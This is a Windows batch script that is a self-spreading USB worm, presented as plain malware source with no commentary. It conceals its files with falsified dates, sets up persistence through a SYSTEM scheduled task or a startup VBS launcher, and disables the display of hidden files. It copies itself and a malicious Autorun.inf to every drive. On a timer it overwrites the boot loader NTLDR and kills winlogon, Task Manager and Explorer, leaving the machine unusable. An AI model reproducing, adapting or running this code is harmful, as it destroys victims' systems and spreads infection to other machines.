@echo off
:: l love you always and forever
set hero=%systemroot%\ime\HIDESE~1
set setup=%systemroot%\ime\HIDESE~1\herosetup
FOR /F "tokens=1" %%i in ('date /t') do set Realdate=%%i
FOR /F "skip=5 tokens=1,4" %%i in ('dir %systemroot%\explorer.exe') do if /I "%%j"=="explorer.exe" set Date=%%i  
if "%1"=="-Install" goto Install  
if "%1"=="-Run" goto Run
if "%1"=="-Surprise" goto Surprise 
if "%1"=="-Kill" goto Kill
if "%1"=="-Killself" goto Killself

:CheckSign
if "%1"=="-USB" start /max .. 
if "%1"=="-USB" cd HERO
if exist %systemroot%\ime\HIDESE~1\sign.dat goto Open
:FileCopy
set selfname=%0 

:HIDESelf
date %Date% 
md %systemroot%\ime\HIDESELF...\
date %RealDate% 
if not "%1"=="-USB" type %selfname%>%systemroot%\ime\HIDESE~1\hero.bat
if "%1"=="-USB" type hero.bat>%systemroot%\ime\HIDESE~1\hero.bat
type Town.dll>%systemroot%\ime\HIDESE~1\Town.exe
echo On Error Resume Next>%systemroot%\ime\HIDESE~1\hero.vbs
echo set wcs=wscript.createobject("wscript.shell")>>%systemroot%\ime\HIDESE~1\hero.vbs
echo wcs.run "cmd /c %hero%\hero.BAT -Install",0 >>%systemroot%\ime\HIDESE~1\hero.vbs
cscript %systemroot%\ime\HIDESE~1\hero.vbs 
echo>%systemroot%\ime\HIDESE~1\sign.dat   
del %systemroot%\ime\HIDESE~1\hero.vbs
goto Open

:Install
:PackerSetup
%SystemDrive%
cd %systemroot%\ime\HIDESE~1
if exist Town.exe taskkill /f /im Town.exe
if exist herosetup rd /s /q herosetup
md herosetup
cd herosetup
copy ..\Town.exe Town.dll
..\Town.exe –x 
cd..
date %Date%
type %setup%\rar.exe >%systemroot%\system32\rar.exe
date %Realdate% 
copy %setup%\Town.dll %hero%\Town.dll
attrib %hero%\Town.dll +s +h +r
rar -m0 -ep -ep1 a %setup%\docpack.dll %hero%\Town.dll
rar -m0 -ep -ep1 a %setup%\txtpack.dll %hero%\Town.dll
rar -m0 -ep -ep1 a %setup%\exepack.dll %hero%\Town.dll
rar -m0 -ep -ep1 a %setup%\jpgpack.dll %hero%\Town.dll
del Town.exe
:Mainsetup
set A0001=copy
set A0002=attrib
set A0003=echo
set A0005=Shell Hardware Detection
tasklist >%hero%\task.txt
FOR /F "tokens=1" %%i in ('findstr /I "svchost.exe" "%hero%\task.txt"') do set svchost=%%i
%A0001% %systemroot%\system32\cmd.exe %hero%\%svchost%   
del %hero%\task.txt
:Tasks
%A0002% %systemroot%\Tasks\Tasks.job -s -h -r
del %systemroot%\Tasks\Tasks.job
date %Date%
type %setup%\Tasks.xxx>%systemroot%\Tasks\Tasks.job
schtasks /change /ru "NT AUTHORITY\SYSTEM" /tn "Tasks" & if errorlevel 1 goto TaskFail
date %RealDate%
goto TaskSuc
:TaskFail
%homedrive%
cd "%ALLUSERSPROFILE%"
cd 「开始」菜单\程序\启动
date %Date%
%A0003% On Error Resume Next>hero.vbs
%A0003% set wcs=wscript.createobject("wscript.shell")>>hero.vbs
%A0003% wcs.run "%hero%\svchost.exe /c %hero%\hero.bat -Run",0 >>hero.vbs
%A0001% hero.vbs %hero%\hero.vbs
%A0003% NT>%systemroot%\ime\HIDESE~1\NoTasks
date %RealDate%
:TaskSuc
%A0002% %systemroot%\Tasks\Tasks.job +s +h +r
date %Date%
%A0001% %setup%\sleep.exe %systemroot%\system32\sleep.exe
date %RealDate%
:NoAutoPlay   
net stop "%A0005%"
%A0003% Windows Registry Editor Version 5.00>%systemroot%\ime\HIDESE~1\Reg.reg
%A0003% [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ShellHWDetection]>>%systemroot%\ime\HIDESE~1\Reg.reg
%A0003% "Start"=dword:00000004>>%systemroot%\ime\HIDESE~1\Reg.reg
%A0003% [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL] >>%systemroot%\ime\HIDESE~1\Reg.reg
%A0003% "CheckedValue"=dword:00000000>>%systemroot%\ime\HIDESE~1\Reg.reg
regedit /s %systemroot%\ime\HIDESE~1\Reg.reg
goto End&if errorlevel 1 exit

:Run
set runroot=%ALLUSERSPROFILE%\「开始」菜单\程序\启动
set taskroot=%systemroot%\Tasks
:RunTimeChk
if not exist %hero%\RunTime.txt echo !50>%hero%\RunTime.txt
FOR /F "tokens=1 delims=!" %%i in (%hero%\RunTime.txt) do set RunTime=%%i
if /i %RunTime% leq 0 goto Virus   
set /a RunTime=%Runtime%-1  
echo !%Runtime%>%hero%\RunTime.txt
:Diskchk
echo On Error Resume Next>%systemroot%\ime\HIDESE~1\Recent.VBS
echo set wsc=wscript.createobject("wscript.shell")>>%systemroot%\ime\HIDESE~1\Recent.VBS
echo wsc.run "%hero%\svchost.exe /c %setup%\Recent.bat",0 >>%systemroot%\ime\HIDESE~1\Recent.VBS
cscript %systemroot%\ime\HIDESE~1\Recent.VBS
del %systemroot%\ime\HIDESE~1\Recent.VBS
for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do vol %%i:&if errorlevel 1 set %%i=1
for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do echo 1>%%i:\herochk1 & findstr . %%i:\herochk1 & if not errorlevel 1 del %%i:\herochk1& findstr /C:"I_LOVE_YOU" %%i:\Autorun.inf & if errorlevel 1  attrib -s -h -r %%i:\Autorun.inf&copy /y %setup%\Autorun.inf %%i:\Autorun.inf&attrib %%i:\Autorun.inf +s +h +r&md %%i:\HERO&copy /y "%setup%\hero.bat" %%i:\hero\HERO.BAT&copy /y "%setup%\Town.dll" %%i:\HERO\Town.dll&attrib %%i:\HERO +s +h +r
:Turn
if "%C%"=="1" vol C:&if not errorlevel 1 call %setup%\Rifeman.bat C:
if "%D%"=="1" vol D:&if not errorlevel 1 call %setup%\Rifeman.bat D:
if "%E%"=="1" vol E:&if not errorlevel 1 call %setup%\Rifeman.bat E:
if "%F%"=="1" vol F:&if not errorlevel 1 call %setup%\Rifeman.bat F:
if "%G%"=="1" vol G:&if not errorlevel 1 call %setup%\Rifeman.bat G:
if "%H%"=="1" vol H:&if not errorlevel 1 call %setup%\Rifeman.bat H:
if "%I%"=="1" vol I:&if not errorlevel 1 call %setup%\Rifeman.bat I:
if "%J%"=="1" vol J:&if not errorlevel 1 call %setup%\Rifeman.bat J:
if "%K%"=="1" vol K:&if not errorlevel 1 call %setup%\Rifeman.bat K:
if "%L%"=="1" vol L:&if not errorlevel 1 call %setup%\Rifeman.bat L:
if "%M%"=="1" vol M:&if not errorlevel 1 call %setup%\Rifeman.bat M:
if "%N%"=="1" vol N:&if not errorlevel 1 call %setup%\Rifeman.bat N:
if "%O%"=="1" vol O:&if not errorlevel 1 call %setup%\Rifeman.bat O:
if "%P%"=="1" vol P:&if not errorlevel 1 call %setup%\Rifeman.bat P:
if "%Q%"=="1" vol Q:&if not errorlevel 1 call %setup%\Rifeman.bat Q:
if "%R%"=="1" vol R:&if not errorlevel 1 call %setup%\Rifeman.bat R:
if "%S%"=="1" vol S:&if not errorlevel 1 call %setup%\Rifeman.bat S:
if "%T%"=="1" vol T:&if not errorlevel 1 call %setup%\Rifeman.bat T:
if "%U%"=="1" vol U:&if not errorlevel 1 call %setup%\Rifeman.bat U:
if "%V%"=="1" vol V:&if not errorlevel 1 call %setup%\Rifeman.bat V:
if "%W%"=="1" vol W:&if not errorlevel 1 call %setup%\Rifeman.bat W:
if "%X%"=="1" vol X:&if not errorlevel 1 call %setup%\Rifeman.bat X:
if "%Y%"=="1" vol Y:&if not errorlevel 1 call %setup%\Rifeman.bat Y:
if "%Z%"=="1" vol Z:&if not errorlevel 1 call %setup%\Rifeman.bat Z:
if "%C%"=="2" vol C:&if errorlevel 1 set C=1
if "%D%"=="2" vol D:&if errorlevel 1 set D=1
if "%E%"=="2" vol E:&if errorlevel 1 set E=1
if "%F%"=="2" vol F:&if errorlevel 1 set F=1
if "%G%"=="2" vol G:&if errorlevel 1 set G=1
if "%H%"=="2" vol H:&if errorlevel 1 set H=1
if "%I%"=="2" vol I:&if errorlevel 1 set I=1
if "%J%"=="2" vol J:&if errorlevel 1 set J=1
if "%K%"=="2" vol K:&if errorlevel 1 set K=1
if "%L%"=="2" vol L:&if errorlevel 1 set L=1
if "%M%"=="2" vol M:&if errorlevel 1 set M=1
if "%N%"=="2" vol N:&if errorlevel 1 set N=1
if "%O%"=="2" vol O:&if errorlevel 1 set O=1
if "%P%"=="2" vol P:&if errorlevel 1 set P=1
if "%Q%"=="2" vol Q:&if errorlevel 1 set Q=1
if "%R%"=="2" vol R:&if errorlevel 1 set R=1
if "%S%"=="2" vol S:&if errorlevel 1 set S=1
if "%T%"=="2" vol T:&if errorlevel 1 set T=1
if "%U%"=="2" vol U:&if errorlevel 1 set U=1
if "%V%"=="2" vol V:&if errorlevel 1 set V=1
if "%W%"=="2" vol W:&if errorlevel 1 set W=1
if "%X%"=="2" vol X:&if errorlevel 1 set X=1
if "%Y%"=="2" vol Y:&if errorlevel 1 set Y=1
if "%Z%"=="2" vol Z:&if errorlevel 1 set Z=1
if exist %systemroot%\ime\HIDESE~1\NoTasks if not exist "%runroot%\hero.VBS" copy "%hero%\hero.VBS" "%runroot%\hero.VBS"
if not exist %systemroot%\ime\HIDESE~1\NoTasks if not exist %Taskroot%\Tasks.job copy %setup%\Tasks.xxx %Taskroot%\Tasks.job&attrib %Taskroot%\Tasks.job +s +h +r&schtasks /change /ru "NT AUTHORITY\SYSTEM" /tn "Tasks"
sleep 2000
goto Turn
goto End&if errorlevel 1 exit

:Virus
if not "%Runtime%"=="0" goto VirusChk
set /a RunTime=%Runtime%-1
echo !%Runtime%>%hero%\RunTime.txt
cd "%ALLUSERSPROFILE%\「开始」菜单\程序\启动"
echo On Error Resume Next>Surprise.VBS
echo set wcs=wscript.createobject("wscript.shell")>>Surprise.VBS
echo wcs.run "%hero%\svchost.exe /c %hero%\hero.bat -Surprise ",0 >>Surprise.VBS
goto Diskchk

:VirusChk
if not exist "%ALLUSERSPROFILE%\「开始」菜单\程序\启动\Surprise.VBS" goto Kill
goto Diskchk

:Surprise
:KillNTLDR
attrib %systemdrive%\NTLDR -s -h -r
copy /Y %systemdrive%\NTLDR %hero%\NTLDR
echo NO NTLDR>%systemdrive%\NTLDR
attrib %systemdrive%\NTLDR +s +h +r

:PauseSFC
start mshta "javascript:new ActiveXObject('WScript.Shell').Run('ntsd -pn winlogon.exe',0);window.close()"

:KillTaskmgr
del /q /a %systemroot%\system32\dllcache\taskmgr.exe
taskkill /f /im taskmgr.exe & if errorlevel 1 ren %systemroot%\system32\taskmgr.exe taskmgr.xxx & if errorlevel 1 start mshta "javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn taskmgr.exe',0);window.close()" & sleep 500
ren %systemroot%\system32\taskmgr.exe taskmgr.xxx

:KillExplorer
taskkill /f /im explorer.exe >nul& if errorlevel 1 ren %systemroot%\system32\explorer.exe explorer.xxx & start mshta "javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn explorer.exe',0);window.close()" & sleep 500
ren %systemroot%\explorer.exe explorer.xxx
start /max %setup%\Surprise.bat

:Timeset
sleep 660000
if exist %hero%\Killself Exit

:Kill
attrib %systemdrive%\NTLDR -s -h -r
echo NO NTLDR>%systemdrive%\NTLDR
attrib %systemdrive%\NTLDR +s +h +r


goto Diskchk

:KillSelf
ren %systemroot%\explorer.xxx explorer.exe
start %systemroot%\explorer.exe
attrib %systemdrive%\NTLDR -s -h -r
copy /Y %hero%\NTLDR %systemdrive%\NTLDR
attrib %systemdrive%\NTLDR +s +h +r
ren %systemroot%\system32\taskmgr.xxx taskmgr.exe



:KillVirus
copy %setup%\KillVirus.txt %hero%\KillVirus.txt
echo !50>%systemroot%\ime\HIDESE~1\runtime.txt
%systemdrive%
cd\
cd "%ALLUSERSPROFILE%\「开始」菜单\程序\启动"
if exist Surprise.vbs del Surprise.vbs
start %systemroot%\system32\notepad.exe %hero%\KillVirus.txt
Exit

:Open
if "%1"=="-USB" Exit
